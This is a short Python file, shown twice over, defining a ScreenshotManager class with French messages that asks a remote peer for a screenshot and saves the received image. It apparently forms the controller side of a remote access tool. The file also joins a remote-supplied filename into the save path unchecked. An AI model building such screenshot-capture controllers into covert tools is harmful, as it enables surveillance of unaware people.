import struct
import os

class ScreenshotManager:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager

    def request_screenshot(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"SCREENSHOT")

            data = self.conn_manager.conn.recv(4)
            if len(data) < 4:
                return "[!] Erreur: Taille du fichier non reçue."

            file_size = struct.unpack("!I", data)[0]
            filename = self.conn_manager.conn.recv(100).decode().strip()

            save_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn_manager.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            return f"[+] Screenshot reçu: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
        except Exception as e:
            return f"[!] Erreur lors de la réception: {str(e)}"
import struct
import os

class ScreenshotManager:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager

    def request_screenshot(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"SCREENSHOT")

            data = self.conn_manager.conn.recv(4)
            if len(data) < 4:
                return "[!] Erreur: Taille du fichier non reçue."

            file_size = struct.unpack("!I", data)[0]
            filename = self.conn_manager.conn.recv(100).decode().strip()

            save_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn_manager.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            return f"[+] Screenshot reçu: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
        except Exception as e:
            return f"[!] Erreur lors de la réception: {str(e)}"